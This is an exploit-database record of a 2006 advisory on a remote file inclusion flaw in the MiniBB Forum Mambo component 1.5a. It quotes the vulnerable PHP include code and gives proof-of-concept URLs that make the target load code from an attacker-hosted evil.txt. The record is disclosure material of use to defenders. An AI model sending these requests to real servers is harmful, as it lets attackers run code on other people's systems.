{
  "id": "2030",
  "title": "Mambo Component MiniBB 1.5a - Remote File Inclusion",
  "cve": "CVE-2006-3690",
  "vuln_type": "unknown",
  "code": "---------------------------------------------------------------------------------------------\r\n\r\nMiniBB Forum Mambo Component <= 1.5a Remote File Include Vulnerabilities\r\n-----------------------------------------------------------------------------------------------\r\n\r\n \r\nAuthor          : Ahmad Maulana a.k.a Matdhule\r\nDate            : July 14th 2006\r\nLocation        : Indonesia, Jakarta\r\nWeb             : http://advisories.echo.or.id/adv/adv39-matdhule-2006.txt\r\n                  https://www.securityfocus.com/bid/18998\r\nCritical Lvl    : Highly critical\r\nImpact          : System access\r\nWhere           : From Remote\r\n------------------------------------------------------------------------\r\n\r\n \r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n# MiniBB Forum\r\n\r\nApplication     : MiniBB Forum (com_minibb.php & index.php)\r\nversion         : 1.5a\r\n\r\n------------------------------------------------------------------------\r\n\r\n \r\nVulnerability:\r\n~~~~~~~~~~~~~~~\r\n \r\n# MiniBB Forum\r\n\r\nIn folder components we found vulnerability script com_minibb.php.\r\n\r\n-----------------------com_minibb.php-----------------------------------\r\n...................\r\n\r\nIf ($current==\"bb_admin\"){\r\n  include(\"$absolute_path/components/minibb/bb_admin.php\");\r\n} else {\r\n  include(\"$absolute_path/components/minibb/index.php\");\r\n...................\r\n\r\n------------------------------------------------------------------------\r\n\r\nIn folder minibb we found vulnerability script index.php.\r\n\r\n-----------------------index.php----------------------------------------\r\n..............................\r\n\r\ndefine ('INCLUDED776',1);\r\n\r\ninclude ($absolute_path.'/components/minibb/setup_options.php');\r\nif (isset($HTTP_COOKIE_VARS[$cookiename.'Language']) and $langCook=${$cookiename.'Language'}) { if\r\n(file_exists(\"$absolute_path/components/minibb/lang/{$langCook}.php\")) $lang=$langCook; }\r\ninclude ($absolute_path.'/components/minibb/setup_'.$DB.'.php');\r\n..............................\r\n\r\nVariables $absolute_path are not properly sanitized. When register_globals=on\r\nand allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.\r\n \r\nProof Of Concept:\r\n~~~~~~~~~~~~~~~~\r\n \r\nhttp://[target]/[path]/components/com_minibb.php?absolute_path=http://attacker.com/evil.txt?\r\nhttp://[target]/[path]/components/minibb/index.php?absolute_path= http://attacker.com/evil.txt?\r\n\r\nSolution:\r\n~~~~~~~~\r\n \r\nsanitize variabel $absolute_path.\r\n \r\n \r\n------------------------------------------------------------------------\r\n---\r\nShoutz:\r\n~~~~~~\r\n~ solpot a.k.a chris, J4mbi  H4ck3r for the hacking lesson :)\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous\r\n~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama\r\n~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com\r\n~ #mardongan #jambihackerlink #e-c-h-o @ irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~~~~~\r\n \r\n     matdhule[at]gmail[dot]com\r\n     \r\n-------------------------------- [ EOF ]---------------------------------- \r\n\r\n# milw0rm.com [2006-07-17]",
  "url": "https://www.exploit-db.com/exploits/2030"
}